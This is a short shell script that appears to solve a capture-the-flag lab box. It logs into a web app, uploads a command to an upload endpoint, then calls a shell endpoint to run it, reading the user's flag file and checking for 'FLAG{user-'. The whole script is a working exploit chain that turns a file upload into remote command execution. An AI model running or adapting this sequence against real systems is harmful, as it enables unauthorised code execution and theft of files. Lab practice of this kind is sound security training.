set -eu
u="${BOX_U:?BOX_U is not set}"
p="${BOX_P:?BOX_P is not set}"
jar=$(mktemp)
curl -fsS -c "$jar" -d "username=$u&password=$p" "http://${BOX_HOST}:8083/${BOX_PATH}/login" >/dev/null
printf 'cat /home/%s/user.txt\n' "$u" | curl -fsS -b "$jar" --data-binary @- "http://${BOX_HOST}:8083/${BOX_PATH}/upload" >/dev/null
out=$(curl -fsS -b "$jar" "http://${BOX_HOST}:8083/${BOX_PATH}/shell")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "uploaded shell did not execute" >&2; exit 1; }
rm -f "$jar"
